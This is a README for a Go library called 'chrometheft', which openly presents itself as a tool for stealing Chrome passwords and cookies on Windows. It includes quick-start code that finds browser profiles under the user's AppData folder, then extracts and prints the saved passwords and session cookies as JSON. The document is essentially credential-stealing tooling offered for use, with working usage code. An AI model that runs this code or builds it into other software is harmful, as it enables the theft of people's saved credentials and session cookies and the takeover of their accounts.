# chrometheft
Flexible Chrome password/cookie theft for Windows    
[![Go Reference](https://pkg.go.dev/badge/github.com/liulihaocai/chrometheft.svg)](https://pkg.go.dev/github.com/liulihaocai/chrometheft)

# Usage
## Quick start
~~~go
package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/liulihaocai/chrometheft"
)

func main() {
	browsers, err := chrometheft.DetectBrowsers(os.Getenv("USERPROFILE") + "\\AppData\\Local")
	if err != nil {
		panic(err)
	}
	for _, browser := range browsers {
		fmt.Println("Browser:", browser)

		fmt.Println("Passwords:")
		passwords, err := chrometheft.GetPasswords(browser)
		if err != nil {
			fmt.Println("Error:", err)
		}
		pwd, _ := json.Marshal(passwords)
		fmt.Println(string(pwd))

		fmt.Println("Cookies:")
		cookies, err := chrometheft.GetCookies(browser)
		if err != nil {
			fmt.Println("Error:", err)
		}
		cok, _ := json.Marshal(cookies)
		fmt.Println(string(cok))
	}
}
~~~
